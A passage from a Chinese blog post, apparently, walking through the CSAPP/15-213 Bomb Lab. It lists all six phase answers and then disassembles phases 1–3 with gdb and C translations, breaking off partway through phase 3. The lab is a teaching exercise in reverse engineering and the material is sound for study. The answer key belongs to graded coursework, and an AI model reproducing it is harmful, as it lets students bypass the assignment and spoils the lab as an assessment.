        <id>https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</id>
        <title>15213 Lab 2-Bomb lab 实验记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;我看见网上非常多的教程里面是一边使用&lt;code&gt;gdb&lt;/code&gt;调试（过程中可能引爆炸弹），一边探索结果的。他们可能多次启动了&lt;code&gt;GDB&lt;/code&gt;来完成实验。但是我在&lt;code&gt;bomb.c&lt;/code&gt;中看到了如下指示:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;No VICTIM may debug, reverse-engineer, run &amp;quot;strings&amp;quot; on, decompile, decrypt, or use any other technique to gain knowledge of and defuse the BOMB.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;并且在 CSAPP 3e 的 handout 中也写的很清楚，不应该多次启动 gdb 来通过输入随机序列的方式来探测密码，毕竟解引的机会只有一次。如果引爆炸弹，autolab 的分数会掉。所以正确的方法应该是对汇编程序进行逆向分析，然后推算炸弹的密码，而不是通过多次输入字符串来利用炸弹进行测试。&lt;/p&gt;
&lt;p&gt;不要一开始就开&lt;code&gt;gdb&lt;/code&gt;运行&lt;code&gt;phase&lt;/code&gt;，可以先启动&lt;code&gt;gdb&lt;/code&gt;，在&lt;code&gt;main&lt;/code&gt;函数部分打断点，因为很多地方需要从&lt;code&gt;gdb&lt;/code&gt;中获取信息，但是我们又不能直接开始做题，因为一做题就无法二次启动&lt;code&gt;gdb&lt;/code&gt;了（会扣实验分）。最好是把每个&lt;code&gt;phase&lt;/code&gt;都分析透彻，得出确定的答案了，再在&lt;code&gt;gdb&lt;/code&gt;中运行，因为中间没有空闲给你打断点和运行，直接进入&lt;code&gt;gets&lt;/code&gt;输入了。&lt;/p&gt;
&lt;p&gt;6 道题的答案为（如果用文件输入的话，记得最后有个换行符，否则炸弹爆炸）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Border relations with Canada have never been better.
1 2 4 8 16 32
0 207
0 0 DrEvil
IONEFG
4 3 2 1 6 5
20
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;题目浏览&#34;&gt;&lt;a href=&#34;#题目浏览&#34; class=&#34;headerlink&#34; title=&#34;题目浏览&#34;&gt;&lt;/a&gt;题目浏览&lt;/h2&gt;&lt;p&gt;首先我们使用&lt;code&gt;wget&lt;/code&gt;命令从&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jc2FwcC5jcy5jbXUuZWR1LzNlL2xhYnMuaHRtbA==&#34;&gt;实验官网&lt;/span&gt;下载&lt;code&gt;tar&lt;/code&gt;文件，使用&lt;code&gt;tar xvf bomb.tar&lt;/code&gt;解压文件。&lt;/p&gt;
&lt;p&gt;打开文件夹，里面有 2 个重要文件，分别是&lt;code&gt;bomb.c&lt;/code&gt;和&lt;code&gt;bomb&lt;/code&gt;二进制文件。我们使用&lt;code&gt;objdump -d bomb &amp;gt; bomb.s&lt;/code&gt;生成二进制可执行文件的反汇编并存储在&lt;code&gt;bomb.s&lt;/code&gt;中。&lt;code&gt;bomb.c&lt;/code&gt;中只有&lt;code&gt;main&lt;/code&gt;函数的部分，&lt;code&gt;main&lt;/code&gt;函数调用的那些函数只在二进制文件和汇编代码中存在。&lt;/p&gt;
&lt;p&gt;我们首先来看&lt;code&gt;bomb.c&lt;/code&gt;，其中含有 6 个 phase 的炸弹，我们需要依次解开。在函数最开始处作者声明可以有多种输入格式，可以从&lt;code&gt;stdin&lt;/code&gt;获取输入，也可以从文件获取输入。每个 phase 都有如下两行：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;phase_n(input);      /* Run the phase               */
phase_defused();     /* Drat!  They figured it out!
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;phase1-分析-基础读值&#34;&gt;&lt;a href=&#34;#phase1-分析-基础读值&#34; class=&#34;headerlink&#34; title=&#34;phase1 分析: 基础读值&#34;&gt;&lt;/a&gt;phase1 分析: 基础读值&lt;/h2&gt;&lt;p&gt;&lt;code&gt;phase_1&lt;/code&gt;的汇编代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000400ee0 &amp;lt;phase_1&amp;gt;:
  400ee0:	48 83 ec 08          	sub    $0x8,%rsp
  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi
  400ee9:	e8 4a 04 00 00       	callq  401338 &amp;lt;strings_not_equal&amp;gt;
  400eee:	85 c0                	test   %eax,%eax
  400ef0:	74 05                	je     400ef7 &amp;lt;phase_1+0x17&amp;gt;
  400ef2:	e8 43 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400ef7:	48 83 c4 08          	add    $0x8,%rsp
  400efb:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;留出 8 个字节的空间&lt;/li&gt;
&lt;li&gt;让&lt;code&gt;%esi = 0x402400&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;strings_not_equal&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;测试&lt;code&gt;%eax&lt;/code&gt;是否等于 0&lt;/li&gt;
&lt;li&gt;若返回值为 0，则恢复栈帧，退出&lt;/li&gt;
&lt;li&gt;否则引爆炸弹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里推测&lt;code&gt;%esi&lt;/code&gt;是给&lt;code&gt;strings_not_equal&lt;/code&gt;提供的参数，且&lt;code&gt;string_not_equal&lt;/code&gt;返回的是个&lt;code&gt;int&lt;/code&gt;类型整数。&lt;/p&gt;
&lt;p&gt;我们打开&lt;code&gt;gdb&lt;/code&gt;，打好断点并运行，输入&lt;code&gt;call strings_not_equal(&amp;quot;a&amp;quot;,&amp;quot;a&amp;quot;)&lt;/code&gt;发现返回 0。输入&lt;code&gt;call string_length(&amp;quot;a&amp;quot;)&lt;/code&gt;发现返回 1。那么&lt;code&gt;strings_not_equal&lt;/code&gt;的作用就是判断两字符串是否不相等，&lt;code&gt;string_length&lt;/code&gt;的作用就是计算字符串的长度。&lt;/p&gt;
&lt;p&gt;我们的目的是让&lt;code&gt;strings_not_equal&lt;/code&gt;返回 0，也就是说我们需要传入两个相同的字符串。那么问题在于我们传入的字符串存储在哪里呢？我们看一下&lt;code&gt;strings_not_equal&lt;/code&gt;的反汇编代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;asm&#34;&gt;0000000000401338 &amp;lt;strings_not_equal&amp;gt;:
seg1:
  401338:	41 54                	push   %r12
  40133a:	55                   	push   %rbp
  40133b:	53                   	push   %rbx
  40133c:	48 89 fb             	mov    %rdi,%rbx
  40133f:	48 89 f5             	mov    %rsi,%rbp
  401342:	e8 d4 ff ff ff       	callq  40131b &amp;lt;string_length&amp;gt;
  401347:	41 89 c4             	mov    %eax,%r12d
  40134a:	48 89 ef             	mov    %rbp,%rdi
  40134d:	e8 c9 ff ff ff       	callq  40131b &amp;lt;string_length&amp;gt;
  401352:	ba 01 00 00 00       	mov    $0x1,%edx

  401357:	41 39 c4             	cmp    %eax,%r12d
  40135a:	75 3f                	jne    40139b &amp;lt;strings_not_equal+0x63&amp;gt;
  40135c:	0f b6 03             	movzbl (%rbx),%eax

  40135f:	84 c0                	test   %al,%al
  401361:	74 25                	je     401388 &amp;lt;strings_not_equal+0x50&amp;gt;

  401363:	3a 45 00             	cmp    0x0(%rbp),%al
  401366:	74 0a                	je     401372 &amp;lt;strings_not_equal+0x3a&amp;gt;
  401368:	eb 25                	jmp    40138f &amp;lt;strings_not_equal+0x57&amp;gt;
seg2:
  40136a:	3a 45 00             	cmp    0x0(%rbp),%al
  40136d:	0f 1f 00             	nopl   (%rax)
  401370:	75 24                	jne    401396 &amp;lt;strings_not_equal+0x5e&amp;gt;
seg3:
  401372:	48 83 c3 01          	add    $0x1,%rbx
  401376:	48 83 c5 01          	add    $0x1,%rbp
  40137a:	0f b6 03             	movzbl (%rbx),%eax

  40137d:	84 c0                	test   %al,%al
  40137f:	75 e9                	jne    40136a &amp;lt;strings_not_equal+0x32&amp;gt;
  401381:	ba 00 00 00 00       	mov    $0x0,%edx
  401386:	eb 13                	jmp    40139b &amp;lt;strings_not_equal+0x63&amp;gt;
seg4:
  401388:	ba 00 00 00 00       	mov    $0x0,%edx
  40138d:	eb 0c                	jmp    40139b &amp;lt;strings_not_equal+0x63&amp;gt;
seg5:
  40138f:	ba 01 00 00 00       	mov    $0x1,%edx
  401394:	eb 05                	jmp    40139b &amp;lt;strings_not_equal+0x63&amp;gt;
seg6:
  401396:	ba 01 00 00 00       	mov    $0x1,%edx
seg7:
  40139b:	89 d0                	mov    %edx,%eax
  40139d:	5b                   	pop    %rbx
  40139e:	5d                   	pop    %rbp
  40139f:	41 5c                	pop    %r12
  4013a1:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其 C 语言代码分析如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;seg2()
&amp;#123;
    if(al != *rbp) &amp;#123;
        seg6();
    &amp;#125;
    else&amp;#123;
        seg3();
    &amp;#125;
&amp;#125;

seg3()
&amp;#123;
    rbx += 1;
    rbp += 1;
    eax = *rbx;
    if(al != 0) &amp;#123;
        // seg2
        seg2();
    &amp;#125;
    else &amp;#123;
        edx = 0;
        seg7();
    &amp;#125;
&amp;#125;

seg4()
&amp;#123;
    edx = 0;
    seg7();
&amp;#125;

seg5()
&amp;#123;
    edx = 1;
    seg7();
&amp;#125;

seg6() &amp;#123;
    edx = 1;
    seg7();
&amp;#125;

seg7()
&amp;#123;
    eax = edx;
    //还原rbx rbp r12
    return eax;
&amp;#125;

// 传入参数有 rdi rsi，返回值在eax中
int strings_not_equal(char* str)
&amp;#123;
    // seg1
    // 保存r12 rbp rbx的值
    rbx = rdi
    rbp = rsi
    call string_length
    r12d = eax
    rdi = rbp
    call string_length
    edx = 0x1;

    if(r12d != eax) &amp;#123;
        seg7();
    &amp;#125;
    else &amp;#123;
        eax = *rbx;
        if(al == 0) &amp;#123;
            seg4();
        &amp;#125;
        else &amp;#123;
            if(al == *rbp) &amp;#123;
                seg3();
            &amp;#125;
            else &amp;#123;
                seg5();
            &amp;#125;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们对调用的函数&lt;code&gt;string_length&lt;/code&gt;反汇编看一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;000000000040131b &amp;lt;string_length&amp;gt;:
  40131b:	80 3f 00             	cmpb   $0x0,(%rdi)
  40131e:	74 12                	je     401332 &amp;lt;string_length+0x17&amp;gt;
  401320:	48 89 fa             	mov    %rdi,%rdx
  401323:	48 83 c2 01          	add    $0x1,%rdx
  401327:	89 d0                	mov    %edx,%eax
  401329:	29 f8                	sub    %edi,%eax
  40132b:	80 3a 00             	cmpb   $0x0,(%rdx)
  40132e:	75 f3                	jne    401323 &amp;lt;string_length+0x8&amp;gt;
  401330:	f3 c3                	repz retq
  401332:	b8 00 00 00 00       	mov    $0x0,%eax
  401337:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其 C 语言转化如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;// 传入参数为 rdi，推测其为字符串的首地址
int string_length()
&amp;#123;
    if(*rdi == 0x0) &amp;#123;
        rax = 0;
        return rax;
    &amp;#125;
    rdx = rdi;
    do&amp;#123;
        rdx += 0x1;
        eax = edx;
        eax -= edi;
    &amp;#125;while(*rdx != 0x0);
    return rax;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为&lt;code&gt;string_length&lt;/code&gt;中传入的应该是字符串首地址，存储在寄存器&lt;code&gt;%rdi&lt;/code&gt;中。而&lt;code&gt;strings_not_equal&lt;/code&gt;中我们使用了两个寄存器&lt;code&gt;%rdi&lt;/code&gt;和&lt;code&gt;%rsi&lt;/code&gt;，那么&lt;code&gt;%rsi&lt;/code&gt;中保存的应该是第二个字符串的地址。而在&lt;code&gt;phase_1&lt;/code&gt;中，我们让&lt;code&gt;%rsi = 0x402400&lt;/code&gt;，也就是说&lt;code&gt;0x402400&lt;/code&gt;这里有个字符串，我们要让输入的字符串和这里的字符串相同，才能让&lt;code&gt;%rax = 0&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;输入&lt;code&gt;x/s 0x402400&lt;/code&gt;，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x402400
0x402400:       &amp;quot;Border relations with Canada have never been better.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这就是我们应该在&lt;code&gt;phase_1&lt;/code&gt;中输入的字符串了！让我们来试试！结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb)
Phase 1 defused. How about the next one?
81          printf(&amp;quot;Phase 1 defused. How about the next one?\n&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功！现在准备解决&lt;code&gt;phase_2&lt;/code&gt;的问题，&lt;code&gt;gdb&lt;/code&gt;先不管。&lt;/p&gt;
&lt;h2 id=&#34;phase2-分析-分支跳转-循环&#34;&gt;&lt;a href=&#34;#phase2-分析-分支跳转-循环&#34; class=&#34;headerlink&#34; title=&#34;phase2 分析: 分支跳转 &amp;amp; 循环&#34;&gt;&lt;/a&gt;phase2 分析: 分支跳转 &amp;amp; 循环&lt;/h2&gt;&lt;p&gt;&lt;code&gt;phase_2&lt;/code&gt;的反汇编如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000400efc &amp;lt;phase_2&amp;gt;:
  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
  400f02:	48 89 e6             	mov    %rsp,%rsi
  400f05:	e8 52 05 00 00       	callq  40145c &amp;lt;read_six_numbers&amp;gt;
  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)
  400f0e:	74 20                	je     400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f10:	e8 25 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  400f15:	eb 19                	jmp    400f30 &amp;lt;phase_2+0x34&amp;gt;

  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
  400f1a:	01 c0                	add    %eax,%eax
  400f1c:	39 03                	cmp    %eax,(%rbx)
  400f1e:	74 05                	je     400f25 &amp;lt;phase_2+0x29&amp;gt;
  400f20:	e8 15 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  400f25:	48 83 c3 04          	add    $0x4,%rbx
  400f29:	48 39 eb             	cmp    %rbp,%rbx
  400f2c:	75 e9                	jne    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f2e:	eb 0c                	jmp    400f3c &amp;lt;phase_2+0x40&amp;gt;

  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
  400f3a:	eb db                	jmp    400f17 &amp;lt;phase_2+0x1b&amp;gt;

  400f3c:	48 83 c4 28          	add    $0x28,%rsp
  400f40:	5b                   	pop    %rbx
  400f41:	5d                   	pop    %rbp
  400f42:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们将其转化为 C 语言试试：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;     // // 400f17
     // eax = *(rbx - 0x4);
     // eax *= 2;
     // if(*rbx == eax) &amp;#123;
     //     rbx += 4;
     //     if(rbx != rbp)
     //         //400f17
     //     else
     //         //400f3c
     //         //恢复栈空间和rbp rbx
     //         return eax;
     // &amp;#125;else &amp;#123;
     //     call explode_bomb
     // &amp;#125;
int phase_2()
&amp;#123;
    //保存rbp rbx
    //rsp留出40个字节
    rsi = rsp;
    call read_six_numbers
    if(*rsp == 0x1) &amp;#123;
        // 400f30
        rbx = rsp + 0x4;
        rbp = rsp + 24;

        // 400f17改写为循环
        do &amp;#123;
            eax = *(rbx - 0x4);
            eax *= 2;
            if(*rbx != eax)
                call explode_bomb
            rbx += 4;
        &amp;#125;while(rbx != rbp)
        return eax;
    &amp;#125;
    else &amp;#123;
        call explode_bomb
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们对&lt;code&gt;read_six_numebrs&lt;/code&gt;反汇编一下看看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;000000000040145c &amp;lt;read_six_numbers&amp;gt;:
  40145c:	48 83 ec 18          	sub    $0x18,%rsp
  401460:	48 89 f2             	mov    %rsi,%rdx
  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx
  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax
  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax
  401474:	48 89 04 24          	mov    %rax,(%rsp)
  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9
  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8
  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi
  401485:	b8 00 00 00 00       	mov    $0x0,%eax
  40148a:	e8 61 f7 ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  40148f:	83 f8 05             	cmp    $0x5,%eax
  401492:	7f 05                	jg     401499 &amp;lt;read_six_numbers+0x3d&amp;gt;
  401494:	e8 a1 ff ff ff       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401499:	48 83 c4 18          	add    $0x18,%rsp
  40149d:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里也有&lt;code&gt;explode_bomb&lt;/code&gt;，有玄机啊~&lt;/p&gt;
&lt;p&gt;先分析&lt;code&gt;read_six_numbers&lt;/code&gt;，这里就一个跳转，整个过程容易分析：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 保留 24 个字节的位置
2. rdx = rsi
3. rcx = rsi + 0x4
4. rax = rsi + 20
5. *(rsp + 8) = rax
6. rax = rsi + 16
7. *rsp = rax
8. r9 = rsi + 12
9. r8 = rsi + 8
10. esi = 0x4025c3
11. eax = 0
12. call sccanf 获取输入
13. if(eax &amp;gt; 5) 恢复栈，返回 eax
14. 否则爆炸
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里传入的应该只有一个参数，就是&lt;code&gt;%rsi&lt;/code&gt;寄存器中的值，在前面&lt;code&gt;phase_2&lt;/code&gt;里面&lt;code&gt;%rsi = %rsp&lt;/code&gt;。那么输入的值应该是从&lt;code&gt;%rsp&lt;/code&gt;开始存储。我们使用如下命令打印&lt;code&gt;0x4025c3&lt;/code&gt;处的值，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x4025c3
0x4025c3:       &amp;quot;%d %d %d %d %d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里&lt;code&gt;%eax&lt;/code&gt;中存储的应该是&lt;code&gt;sscanf&lt;/code&gt;读入的数据个数，如果&lt;code&gt;%eax &amp;gt; 5&lt;/code&gt;的话，&lt;code&gt;read_six_numbers&lt;/code&gt;顺利过关，否则爆炸。&lt;/p&gt;
&lt;p&gt;那么数组应该是保存在&lt;code&gt;%rsi&lt;/code&gt;指向的位置（也就是一开始&lt;code&gt;%rsp&lt;/code&gt;指向的位置），通过分析&lt;code&gt;phase_2&lt;/code&gt;的代码，我们可以总结出以下要求：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;输入的第 1 个数必须是 1&lt;/li&gt;
&lt;li&gt;下一个数是前一个数的两倍&lt;/li&gt;
&lt;li&gt;输入 6 个数字，而且是整数，不是浮点数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么了解了要求后，我们需要输入&lt;code&gt;1 2 4 8 16 32&lt;/code&gt;这 6 个数，看看结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb)
That&amp;#39;s number 2.  Keep going!
88          printf(&amp;quot;That&amp;#39;s number 2.  Keep going!\n&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;phase_2&lt;/code&gt;破解成功！我们继续&lt;code&gt;phase_3&lt;/code&gt;！&lt;/p&gt;
&lt;h2 id=&#34;phase3-分析：switch语句&#34;&gt;&lt;a href=&#34;#phase3-分析：switch语句&#34; class=&#34;headerlink&#34; title=&#34;phase3 分析：switch语句&#34;&gt;&lt;/a&gt;phase3 分析：&lt;code&gt;switch&lt;/code&gt;语句&lt;/h2&gt;&lt;p&gt;&lt;code&gt;phase_3&lt;/code&gt;的反汇编代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000400f43 &amp;lt;phase_3&amp;gt;:
  400f43:	48 83 ec 18          	sub    $0x18,%rsp
  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi
  400f56:	b8 00 00 00 00       	mov    $0x0,%eax
  400f5b:	e8 90 fc ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  400f60:	83 f8 01             	cmp    $0x1,%eax
  400f63:	7f 05                	jg     400f6a &amp;lt;phase_3+0x27&amp;gt;
  400f65:	e8 d0 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
  400f6f:	77 3c                	ja     400fad &amp;lt;phase_3+0x6a&amp;gt;
  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax
  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)
  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax
  400f81:	eb 3b                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax
  400f88:	eb 34                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax
  400f8f:	eb 2d                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f91:	b8 85 01 00 00       	mov    $0x185,%eax
  400f96:	eb 26                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax
  400f9d:	eb 1f                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax
  400fa4:	eb 18                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax
  400fab:	eb 11                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;

  400fad:	e8 88 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax
  400fb7:	eb 05                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax

  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  400fc9:	48 83 c4 18          	add    $0x18,%rsp
  400fcd:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;del&gt;这段代码较长，我们将其转化为 C 语言试试&lt;/del&gt;：&lt;br&gt;我们先不转化成 C 语言，先来看一下让炸弹爆炸的几个条件。炸弹爆炸出现在如下几个地方：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400f65:	e8 d0 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fad:	e8 88 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对第一处，我们先进行分析：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400f43:	48 83 ec 18          	sub    $0x18,%rsp
  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi
  400f56:	b8 00 00 00 00       	mov    $0x0,%eax
  400f5b:	e8 90 fc ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  400f60:	83 f8 01             	cmp    $0x1,%eax
  400f63:	7f 05                	jg     400f6a &amp;lt;phase_3+0x27&amp;gt;
  400f65:	e8 d0 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码首先分配了 24 个字节的栈空间，随后做了如下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;rcx &amp;#x3D; rsp + 12&lt;/li&gt;
&lt;li&gt;rdx &amp;#x3D; rsp + 8&lt;/li&gt;
&lt;li&gt;esi &amp;#x3D; 0x4025cf&lt;/li&gt;
&lt;li&gt;eax &amp;#x3D; 0&lt;/li&gt;
&lt;li&gt;call sscanf&lt;/li&gt;
&lt;li&gt;将 eax 与 1 进行比较&lt;/li&gt;
&lt;li&gt;如果 eax &amp;gt; 1，跳转到&lt;code&gt;400f6a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;否则炸弹爆炸&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这段代码和我们上一段看到的&lt;code&gt;sscanf&lt;/code&gt;之前的代码非常相似，&lt;code&gt;0x4025cf&lt;/code&gt;多半是一个让你输入一串东西的指令地址，我们看一下&lt;code&gt;%esi(0x4025cf)&lt;/code&gt;附近的值等于多少：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x4025cf
0x4025cf:       &amp;quot;%d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里说明我们需要输入 2 个数字，如果不是输入 2 个数字的话，炸弹就会爆炸。第一个要求明确了。&lt;/p&gt;
&lt;p&gt;再来看第二处炸弹的位置前后的代码，它的上一条代码是个&lt;code&gt;jmp&lt;/code&gt;，那么就不可能从那儿执行到这儿来，因为炸弹爆炸了，所以他后面的代码也不可能执行，所以我们只需要看看哪些代码会跳转到这一条(&lt;code&gt;400fad&lt;/code&gt;)上来。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
  400f6f:	77 3c                	ja     400fad &amp;lt;phase_3+0x6a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码出现在我们获取了两个整数之后。这段代码比较了&lt;code&gt;*(rsp + 8)&lt;/code&gt;和&lt;code&gt;0x7&lt;/code&gt;的值。为了不跳转到&lt;code&gt;400fad&lt;/code&gt;，我们需要让&lt;code&gt;%rsp + 8 &amp;lt;= 0x7&lt;/code&gt;。第二个要求明确了。&lt;/p&gt;
&lt;p&gt;最后一个炸弹前的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax

  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码中实现如下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;eax &amp;#x3D; 0x137&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;eax != *(rsp + 12)&lt;/code&gt;，那么炸弹爆炸，也就是说输入的第二个参数最后必须等于&lt;code&gt;0x137&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;现在问题来了，有几个代码通过跳转来到了&lt;code&gt;400fbe&lt;/code&gt;位置，我们需要分析其情况，看看其是否对&lt;code&gt;%rsp + 12&lt;/code&gt;处的值做了操作。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax -&amp;gt;eax = 0xcf
  400f81:	eb 3b                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax -&amp;gt; eax = 0x2c3
  400f88:	eb 34                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax -&amp;gt; eax = 0x100
